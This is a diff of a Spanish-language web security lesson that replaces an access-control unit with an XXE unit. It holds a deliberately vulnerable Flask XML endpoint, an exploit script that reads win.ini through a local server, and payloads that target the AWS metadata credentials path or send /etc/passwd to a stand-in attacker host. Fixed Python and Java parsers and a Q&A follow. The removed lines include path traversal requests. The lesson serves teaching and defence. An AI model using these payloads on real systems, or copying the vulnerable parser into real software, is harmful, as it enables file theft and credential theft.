-    r = requests.get(f"{base}/api/files/..\\..\\..\\windows\\win.ini")
-    print(f"Path traversal backslash: {r.status_code} - {r.json()}")
-
-    # Prueba 5: Acceso legitimo (crear archivo de prueba primero)
-    import os
-    test_file = os.path.join(os.path.dirname(__file__), 'user_files', 'test.txt')
-    os.makedirs(os.path.dirname(test_file), exist_ok=True)
-    with open(test_file, 'w') as f:
-        f.write('Contenido de prueba')
-
-    r = requests.get(f"{base}/api/files/test.txt")
-    print(f"Acceso legitimo: {r.status_code} - {r.text}")
-
-    # Prueba 6: Archivo inexistente
-    r = requests.get(f"{base}/api/files/noexiste.txt")
-    print(f"Archivo inexistente: {r.status_code} - {r.json()}")
+def upload_xml():
+    xml_data = request.data
+    try:
+        root = ET.fromstring(xml_data)
+        content = root.find('data').text if root.find('data') is not None else ''
+        return jsonify({'content': content})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 400
 
 if __name__ == '__main__':
-    # Descomentar para probar: test_security()
     app.run(host='127.0.0.1', port=5000, debug=False)
 ```
+
+**Paso 2: Crear script de explotacion**
+
+```python
+"""
+exploit_xxe.py - Explotacion de XXE
+"""
+import requests
+
+# Payload para leer archivo de Windows
+payload = """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
+]>
+<root>
+    <data>&xxe;</data>
+</root>"""
+
+url = "http://127.0.0.1:5000/api/upload"
+response = requests.post(url, data=payload, headers={'Content-Type': 'application/xml'})
+
+print("=== RESPUESTA DEL SERVIDOR ===")
+print(response.text)
+
+# Si funciona, veremos el contenido de win.ini
+# Si no funciona, veremos un mensaje de error
+```
+
+**Paso 3: Ejecutar la explotacion**
+
+```bash
+# Terminal 1: Iniciar el servidor
+python server_vulnerable.py
+
+# Terminal 2: Ejecutar el exploit
+python exploit_xxe.py
+```
+
+**Paso 4: Version corregida con defusedxml**
+
+```python
+"""
+server_seguro.py - Servidor seguro contra XXE
+"""
+from flask import Flask, request, jsonify
+from defusedxml import ElementTree as safe_ET
+
+app = Flask(__name__)
+
+@app.route('/api/upload', methods=['POST'])
+def upload_xml():
+    xml_data = request.data
+    try:
+        # defusedxml bloquea automaticamente entidades externas
+        root = safe_ET.fromstring(xml_data)
+        content = root.find('data').text if root.find('data') is not None else ''
+        return jsonify({'content': content})
+    except Exception as e:
+        return jsonify({'error': f'Error parseando XML: {str(e)}'}), 400
+
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=5000, debug=False)
+```
+
+**Paso 5: Verificar que la mitigacion funciona**
+
+Ejecutar el exploit `exploit_xxe.py` contra `server_seguro.py`. Ahora debe fallar porque defusedxml rechaza las entidades externas.
+
+**Instalacion de dependencias:**
+
+```bash
+pip install flask requests defusedxml
+```
+
+---
+
+## Ejercicio 2: Parser Java Seguro contra XXE
+
+### Escenario
+
+Tienes un servicio Java que recibe XML de clientes. Debes configurar correctamente el parser para bloquear XXE.
+
+**Codigo vulnerable original:**
+
+```java
+// VulnerableXMLParser.java
+import javax.xml.parsers.*;
+import org.w3c.dom.*;
+import java.io.*;
+
+public class VulnerableXMLParser {
+
+    public String parseXML(String xmlInput) throws Exception {
+        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+        DocumentBuilder builder = factory.newDocumentBuilder();
+        Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
+        return doc.getDocumentElement().getTextContent();
+    }
+
+    public static void main(String[] args) throws Exception {
+        VulnerableXMLParser parser = new VulnerableXMLParser();
+
+        // XML malicioso con XXE
+        String maliciousXML = "<?xml version=\"1.0\"?>"
+            + "<!DOCTYPE foo ["
+            + "  <!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">"
+            + "]>"
+            + "<root><data>&xxe;</data></root>";
+
+        String result = parser.parseXML(maliciousXML);
+        System.out.println("Resultado: " + result);
+    }
+}
+```
+
+**Codigo corregido (seguro):**
+
+```java
+// SafeXMLParser.java
+import javax.xml.parsers.*;
+import javax.xml.XMLConstants;
+import org.w3c.dom.*;
+import org.xml.sax.*;
+import java.io.*;
+
+public class SafeXMLParser {
+
+    public String parseXML(String xmlInput) throws Exception {
+        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+
+        // === CONFIGURACIONES DE SEGURIDAD ===
+
+        // 1. Deshabilitar completamente DTD (recomendado si no se necesita)
+        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+
+        // 2. Deshabilitar entidades externas generales
+        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
+
+        // 3. Deshabilitar entidades externas de parametro
+        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+
+        // 4. Deshabilitar carga de DTD externo
+        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
+
+        // 5. Deshabilitar XInclude
+        factory.setXIncludeAware(false);
+        factory.setExpandEntityReferences(false);
+
+        // 6. Configurar constantes de seguridad de JAXP (Java 8u121+)
+        factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
+
+        // 7. Establecer limite de acceso de estilo (style sheet)
+        try {
+            factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
+            factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
+        } catch (IllegalArgumentException e) {
+            // No todos los factories soportan estos atributos
+        }
+
+        DocumentBuilder builder = factory.newDocumentBuilder();
+
+        // Configurar un manejador de errores personalizado
+        builder.setErrorHandler(new ErrorHandler() {
+            @Override
+            public void warning(SAXParseException e) {
+                System.out.println("Warning: " + e.getMessage());
+            }
+            @Override
+            public void error(SAXParseException e) {
+                System.out.println("Error: " + e.getMessage());
+            }
+            @Override
+            public void fatalError(SAXParseException e) throws SAXException {
+                throw new SAXException("Error fatal parseando XML: " + e.getMessage());
+            }
+        });
+
+        Document doc = builder.parse(new InputSource(new StringReader(xmlInput)));
+        return doc.getDocumentElement().getTextContent();
+    }
+
+    public static void main(String[] args) {
+        SafeXMLParser parser = new SafeXMLParser();
+
+        // Prueba 1: XML malicioso con XXE
+        String maliciousXML = "<?xml version=\"1.0\"?>"
+            + "<!DOCTYPE foo ["
+            + "  <!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">"
+            + "]>"
+            + "<root><data>&xxe;</data></root>";
+
+        try {
+            String result = parser.parseXML(maliciousXML);
+            System.out.println("Resultado: " + result);
+        } catch (Exception e) {
+            System.out.println("BLOQUEADO - Ataque XXE detectado: " + e.getMessage());
+        }
+
+        // Prueba 2: XML legitimo debe funcionar
+        String legitXML = "<root><data>Hola mundo</data></root>";
+        try {
+            String result = parser.parseXML(legitXML);
+            System.out.println("XML legitimo procesado: " + result);
+        } catch (Exception e) {
+            System.out.println("Error con XML legitimo: " + e.getMessage());
+        }
+    }
+}
+```
+
+**Compilar y ejecutar:**
+
+```bash
+javac SafeXMLParser.java
+java SafeXMLParser
+```
+
+---
+
+## Ejercicio 3: Detectar y Clasificar Variantes de XXE
+
+Dados los siguientes fragmentos de codigo, identificar que tipo de XXE representa cada uno y que impacto tendria.
+
+**Caso A:**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
+]>
+<root>&xxe;</root>
+```
+
+**Caso B:**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % dtd SYSTEM "http://atacante.com/evil.dtd">
+    %dtd;
+]>
+<root>&send;</root>
+```
+
+**Caso C:**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+    <!ENTITY lol "lol">
+    <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<root>&lol3;</root>
+```
+
+**Solucion:**
+
+| Caso | Tipo | Impacto | Explicacion |
+|------|------|---------|-------------|
+| A | In-band XXE + SSRF | Acceso a metadata de instancia AWS (credentials IAM) | La entidad apunta a la IP interna de AWS metadata service (169.254.169.254) y el resultado se ve en la respuesta |
+| B | Blind XXE (OOB) | Exfiltracion de /etc/passwd a servidor del atacante | Usa DTD externo para enviar datos via HTTP; el resultado no se ve en la respuesta directa |
+| C | DoS (Billion Laughs) | Agotamiento de memoria del servidor | Entidades anidadas que se expanden exponencialmente (1000+ expansiones) |
 
 ---
 
 ## Preguntas y Respuestas
 
 ### Pregunta 1
-**Cual es la diferencia fundamental entre autenticacion y autorizacion? De un ejemplo donde falle cada una.**
+**Que diferencia hay entre entidades XML internas y externas? Cual es la base del ataque XXE?**
 
-**Respuesta:** La autenticacion verifica la identidad (quien eres), mientras que la autorizacion verifica los permisos (que puedes hacer). Ejemplo de falla de autenticacion: un sistema que permite login con contrasenas debiles o sin 2FA, permitiendo que un atacante ingrese como otro usuario. Ejemplo de falla de autorizacion: un usuario normal que accede a `/api/admin/delete` porque el sistema no verifica su rol antes de ejecutar la accion. Ambas deben funcionar correctamente para tener seguridad; una sin la otra es insuficiente.
+**Respuesta:** Las entidades internas definen contenido directamente en el DTD (`<!ENTITY nombre "valor">`), mientras que las entidades externas cargan contenido desde una fuente externa usando `SYSTEM` o `PUBLIC` (`<!ENTITY ext SYSTEM "URL">`). La base del ataque XXE es que el parser XML, al expandir una entidad externa, accede a recursos del servidor (archivos locales, URLs internas) que el atacante no deberia poder leer.
 
 ### Pregunta 2
-**Que es IDOR y como se previene? De un ejemplo concreto.**
+**Como se diferencia un ataque XXE In-band de uno Blind XXE?**
 
-**Respuesta:** IDOR (Insecure Direct Object Reference) ocurre cuando una aplicacion expone identificadores internos (IDs numericos, UUIDs, nombres de archivo) y no verifica que el usuario tenga permiso para acceder a ese objeto. Ejemplo: `GET /api/factura/123` devuelve la factura sin verificar que pertenezca al usuario autenticado. Prevencion: (1) siempre verificar que el recurso pertenece al usuario antes de devolverlo, (2) usar identificadores no predecibles (UUIDs), (3) implementar controles de acceso a nivel de objeto, (4) nunca confiar en IDs enviados por el cliente sin validacion del lado del servidor.
+**Respuesta:** En el XXE In-band (o clasico), el contenido del archivo leido se devuelve directamente en la respuesta HTTP del servidor, por lo que el atacante ve el resultado inmediatamente. En Blind XXE, el servidor no devuelve el contenido en la respuesta. El atacante debe usar tecnicas out-of-band (OOB), como hacer que el servidor envie el contenido a un servidor controlado por el atacante via HTTP, FTP o DNS. Blind XXE es mas complejo pero tambien evade detecciones basicas.
 
 ### Pregunta 3
-**Que es path traversal y como se mitiga eficazmente?**
+**Por que defusedxml es seguro y xml.etree.ElementTree no lo es?**
 
-**Respuesta:** Path traversal es una tecnica donde el atacante usa `../` (o variantes como `..%2f`, `....//`, `..\\`) para navegar fuera del directorio permitido y acceder a archivos arbitrarios del sistema. Mitigaciones: (1) no confiar en el input del usuario para construir paths del sistema de archivos, (2) normalizar el path con `os.path.abspath()` y verificar que comience con el directorio base permitido, (3) usar `os.path.basename()` para eliminar componentes de directorio, (4) desactivar el soporte de path traversal en el servidor web, (5) usar identificadores numericos o UUIDs en lugar de nombres de archivo directos.
+**Respuesta:** `xml.etree.ElementTree` de la biblioteca estandar de Python procesa DTD y entidades externas por defecto, permitiendo XXE. `defusedxml` es un wrapper que protege contra: (1) entidades externas (XXE), (2) Billion Laughs (DoS por expansion de entidades), (3) expansion de entidades cuadratica, (4) compression bombs (bombs.zip). Lo hace estableciendo limites estrictos en la expansion de entidades y rechazando entidades externas. Ademas, `defusedxml` mantiene la misma API que ElementTree, por lo que el cambio es minimo: solo importar `from defusedxml import ElementTree as ET`.
 
 ### Pregunta 4
-**Explica el principio de minimo privilegio con un ejemplo practico en una aplicacion web.**
+**Que es SSRF y como se relaciona con XXE?**
 
-**Respuesta:** El principio de minimo privilegio establece que cada usuario, proceso o sistema debe tener exactamente los permisos necesarios para realizar su funcion, ni mas ni menos. Ejemplo practico en una aplicacion web: (1) los usuarios viewer solo tienen permiso de lectura en documentos especificos, (2) los usuarios user tienen lectura y escritura pero solo en documentos propios, (3) solo los admins tienen permiso de eliminacion y gestion de usuarios. Esto limita el dano potencial: si un atacante compromete una cuenta viewer, no puede modificar ni eliminar datos; si compromete una cuenta user, solo afecta datos de ese usuario, no del sistema completo.
+**Respuesta:** SSRF (Server-Side Request Forgery) ocurre cuando un atacante hace que el servidor realice peticiones HTTP a destinos internos. En XXE, el atacante define una entidad externa que apunta a una URL interna (ej: `http://169.254.169.254/` para metadata de AWS, `http://localhost:9200/` para Elasticsearch, `http://admin:admin@localhost:8080/` para admin panels internos). El parser XML, al expandir la entidad, hace la peticion desde el servidor, permitiendo al atacante sortear firewalls y acceder a sistemas que no deberian ser accesibles desde internet.
 
 ### Pregunta 5
-**Como implementarias un sistema de control de acceso robusto en una API REST?**
+**Cual es la mitigacion mas efectiva contra XXE? Debe deshabilitarse todo el soporte DTD?**
 
-**Respuesta:** Un sistema robusto incluye: (1) autenticacion fuerte (JWT con expiration corto, refresh tokens, 2FA opcional), (2) un modelo de permisos granular (no solo roles, sino permisos especificos como `documentos:leer`, `documentos:eliminar`), (3) verificacion en cada endpoint usando decoradores/middleware (nunca solo en el frontend), (4) verificacion de pertenencia del recurso (el usuario solo accede a sus propios recursos a menos que sea admin), (5) logging de todos los accesos denegados para deteccion de ataques, (6) pruebas automatizadas que verifiquen que cada rol solo puede hacer lo que debe, (7) revision periodica de la matriz de permisos.
+**Respuesta:** La mitigacion mas efectiva es deshabilitar completamente el procesamiento de DTD si la aplicacion no lo necesita (`disallow-doctype-decl: true`). Si la aplicacion requiere DTD por razones de negocio (esquemas XML, validacion), se deben deshabilitar al menos las entidades externas generales y de parametro. En Python, la opcion mas simple es usar `defusedxml`. En Java, configurar las features de DocumentBuilderFactory. La regla de oro: si no necesitas DTD, deshabilitalo completamente. Si lo necesitas, reduce al minimo las capacidades de DTD y valida estrictamente el input.
 
 ### Pregunta 6
-**Cual es el riesgo de confiar en el rol que el cliente envia en la request?**
+**Es posible hacer XXE en JSON o solo en XML?**
 
-**Respuesta:** Confiar en el rol enviado por el cliente es extremadamente peligroso porque cualquier atacante puede modificar la request para enviar un rol de admin. Ejemplo: un sistema que lee `request.json.get('role')` para determinar si el usuario es admin. Un atacante simplemente envia `{"role": "admin"}` en el body de la request y obtiene privilegios administrativos. La unica fuente confiable del rol debe ser el servidor, obtenido de la sesion del usuario o del token JWT firmado, nunca de parametros que el cliente pueda manipular.
+**Respuesta:** XXE es especifico de XML porque solo XML tiene DTD y entidades externas. Sin embargo, algunas aplicaciones aceptan XML aunque la API principal use JSON (por ejemplo, servicios SOAP, procesamiento de documentos Office (OOXML), SVG, RSS/Atom feeds). Ademas, ataque similares existen en otros formatos: JSON injection, YAML deserialization con `!!` tags. Siempre que la aplicacion procese XML en alguna capa (log4j con XML layout, JMS con mensajes XML, SAML), hay riesgo de XXE.
+
+### Pregunta 7
+**Como se protege contra Billion Laughs attack ademas de deshabilitar DTD?**
+
+**Respuesta:** Ademas de deshabilitar DTD, se pueden establecer limites en el parser: (1) limite de profundidad de entidades anidadas, (2) limite de expansion total de entidades (ej: `entity_expansion_limit` en libxml2), (3) limite de tamaño maximo del documento XML, (4) timeout de parseo. En Python con `defusedxml`, estos limites ya vienen configurados por defecto. En Java, usar `XMLConstants.FEATURE_SECURE_PROCESSING` establece limites conservadores de expansion.
 
 ---
 
 ## Tarea / Lectura Recomendada
 
-1. **Leer:** OWASP Authorization Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html
-2. **Leer:** OWASP Access Control Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html
-3. **Practicar:** PortSwigger - Access Control labs: https://portswigger.net/web-security/access-control
-4. **Leer:** OWASP Insecure Direct Object Reference Prevention - https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html
-5. **Practicar:** Implementar RBAC en un proyecto propio usando decoradores en Python o middleware en Express/Spring
-6. **Experimentar:** Usar Burp Suite para interceptar requests de una app vulnerable a IDOR y modificar parametros
+1. **Leer:** OWASP XXE Prevention Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+2. **Leer:** OWASP XML Security Cheat Sheet - https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html
+3. **Practicar:** PortSwigger Web Security Academy - XXE labs: https://portswigger.net/web-security/xxe
+4. **Experimentar:** Configurar un servidor Flask que acepte XML y probar payloads XXE en un entorno controlado
+5. **Leer:** Documentacion de defusedxml - https://pypi.org/project/defusedxml/
+6. **Profundizar:** Investigar el ataque XXE en el contexto de Office Open XML (archivos .docx, .xlsx que son ZIP con XML dentro)
+
 
 
